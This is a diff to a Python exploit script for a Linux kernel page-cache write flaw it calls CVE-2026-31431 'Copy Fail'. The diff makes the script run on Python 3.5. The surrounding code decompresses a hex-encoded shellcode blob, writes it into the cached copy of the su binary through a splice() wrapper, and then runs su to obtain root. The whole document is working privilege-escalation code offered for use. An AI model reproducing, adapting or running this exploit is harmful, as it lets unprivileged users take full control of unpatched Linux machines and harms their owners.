@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 CVE-2026-31431 "Copy Fail" Exploit
-Python 3.9+ compatible (includes splice() syscall wrapper)
+Python 3.5+ compatible (includes splice() syscall wrapper)
 
 This exploit targets a Linux kernel vulnerability in the authencesn AEAD
 cryptographic implementation that allows arbitrary writes to the page cache.
@@ -13,9 +13,12 @@ import zlib
 import socket
 import ctypes
 import ctypes.util
+import sys
 
-# Python 3.9 doesn't have os.splice(), so we implement it via ctypes
-# This makes the exploit portable across Python versions
+# Check Python version
+if sys.version_info < (3, 5):
+    print("[-] This script requires Python 3.5 or higher")
+    sys.exit(1)
 
 # Load libc
 libc = ctypes.CDLL(ctypes.util.find_library('c'))
@@ -37,7 +40,7 @@ libc.splice.restype = ctypes.c_ssize_t
 def splice(src, dst, count, offset_src=None, offset_dst=None):
     """
     Wrapper for splice() syscall matching Python os.splice() API
-    Compatible with Python 3.9+ (which lacks os.splice())
+    Compatible with Python 3.5+ (which lacks os.splice())
 
     Args:
         src: Source file descriptor
@@ -50,7 +53,7 @@ def splice(src, dst, count, offset_src=None, offset_dst=None):
     p_off_dst = ctypes.pointer(off64_t(offset_dst)) if offset_dst is not None else None
     result = libc.splice(src, p_off_src, dst, p_off_dst, count, 0)
     if result < 0:
-        raise OSError(f"splice() failed with return code {result}")
+        raise OSError("splice() failed with return code {}".format(result))
     return result
 
 def d(x):
@@ -122,24 +125,26 @@ def set_target():
     elif os.path.exists(FALLBACK_TARGET):
         return FALLBACK_TARGET
     else:
-        raise FileNotFoundError(f"Could not find su binary. Tried: {TARGET_BINARY}, {FALLBACK_TARGET}")
+        raise FileNotFoundError("Could not find su binary. Tried: {}, {}".format(
+            TARGET_BINARY, FALLBACK_TARGET))
 
 # Main exploit
 print("[*] CVE-2026-31431 Copy Fail Exploit")
+print("[*] Python version: {}".format(sys.version.split()[0]))
 target_path = set_target()
-print(f"[*] Target: {target_path}")
-print()
+print("[*] Target: {}".format(target_path))
+print("")
 
 try:
     # Open target file
     f = os.open(target_path, os.O_RDONLY)
-    print(f"[+] Opened {target_path} (fd={f})")
+    print("[+] Opened {} (fd={})".format(target_path, f))
 except PermissionError:
-    print(f"[-] Permission denied. Please run as root or with sufficient privileges.")
-    exit(1)
+    print("[-] Permission denied. Please run as root or with sufficient privileges.")
+    sys.exit(1)
 except FileNotFoundError:
-    print(f"[-] Target {target_path} not found.")
-    exit(1)
+    print("[-] Target {} not found.".format(target_path))
+    sys.exit(1)
 
 # Decompress shellcode
 i = 0
@@ -147,19 +152,19 @@ e = zlib.decompress(d(
     "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
 ))
 
-print(f"[+] Shellcode size: {len(e)} bytes")
-print(f"[+] Patching {target_path} in page cache...")
+print("[+] Shellcode size: {} bytes".format(len(e)))
+print("[+] Patching {} in page cache...".format(target_path))
 
 # Write shellcode 4 bytes at a time
 while i < len(e):
     c(f, i, e[i:i+4])
     i += 4
     if i % 16 == 0:
-        print(f"    Written {i}/{len(e)} bytes...")
+        print("    Written {}/{} bytes...".format(i, len(e)))
 
 print("[+] Page cache patching complete!")
 print("[+] Executing modified su...")
-print()
+print("")
 
 # Execute patched su - should give root
-os.system(f"su")
+os.system("su")
